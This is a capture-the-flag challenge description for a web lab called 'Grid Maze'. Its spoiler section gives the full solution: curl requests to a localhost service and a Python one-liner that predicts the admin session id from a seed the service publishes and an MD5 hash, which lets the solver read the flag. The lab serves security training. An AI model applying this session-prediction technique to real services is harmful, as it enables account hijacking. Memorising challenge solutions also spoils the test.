# w18 :: Grid Maze

- **Category:** Web
- **Difficulty:** medium
- **Stack:** Python 3.12 / stdlib only
- **URL:** http://localhost:30018

## Brief

GRID MAZE maps one grid to each role. The `admin` grid is the one that holds
the way out. Every visitor gets a session; the session id is not random.

The service builds an id from a **per-boot counter** and a **per-container
seed**, run through a weak hash. It is proud enough of this to publish the
scheme — and the seed — on `/api/health`, "so operators can reproduce an id in
a pinch".

Alongside that, `/api/session/preauth` opens a temporary session and lets the
caller *name a role preference*. That preference is not discarded at login.

## Goal

Reach the `admin` grid and read the flag from `/api/flag`.

## Hint

`GET /api/health` tells you the seed and the formula. The only unknown left is
the counter — and the counter starts at 0 every time the container boots.

The service has its own admin account. It was created **before** you ever
connected. Which counter value do you think it landed on?

<details>
<summary>Spoiler</summary>

The id scheme is published verbatim:

```bash
curl -s http://localhost:30018/api/health
# {"service":"grid-maze","lab":"w18","sessions":2,
#  "session_seed":"gm-1f2e3d4c",
#  "id_scheme":"gs_ + md5(session_seed + ':' + counter)[:20]", ...}
```

Boot creates `maze-bot-admin` first, so it holds **counter 1**. Compute:

```bash
python -c "import hashlib,sys; s=sys.argv[1]; print('gs_'+hashlib.md5(f'{s}:1'.encode()).hexdigest()[:20])" gm-1f2e3d4c
# gs_<20 hex>
```

Present it and the flag falls out:

```bash
curl -s "http://localhost:30018/api/flag?sid=gs_<20 hex>"
# {"grid":"admin","user":"maze-bot-admin","flag":"hex4b0t{...}"}
```

`solution/exploit.py` does this in one step; `solution/probe.sh` also asserts
that a normal player session is still refused, so you can see the guard is real
and not just broken.

</details>
